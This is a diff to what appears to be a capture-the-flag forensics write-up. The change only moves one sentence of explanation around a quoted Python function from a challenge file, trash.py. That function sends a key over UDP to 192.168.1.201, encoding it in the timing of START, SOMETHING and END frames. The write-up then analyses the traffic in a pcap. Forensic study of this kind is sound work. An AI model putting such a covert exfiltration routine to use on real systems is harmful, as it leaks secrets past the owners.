@@ -6,8 +6,6 @@
 
 3. So we need to understand just how the key was generated, a closer inspection of trash.py reveals a few key lines.
 
-   So from this it looks like the key was sent to 192.168.1.201, starting with `START` and ending with `END` with the key (A OR B) in the middle being dictated by the `SOMETHING` frames and the timing
-
    ```python
 def transmit_key(key):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -19,6 +17,8 @@ def transmit_key(key):
         s.sendto('SOMETHING', ('192.168.1.201', 1234))
     s.sendto('END', ('192.168.1.201', 1234))
 ```
+
+   So from this it looks like the key was sent to 192.168.1.201, starting with `START` and ending with `END` with the key (A OR B) in the middle being dictated by the `SOMETHING` frames and the timing
 
 4. Most likely this is what the pcap file was for so lets open that up in wireshark and take a look at the individual timing of frames
 
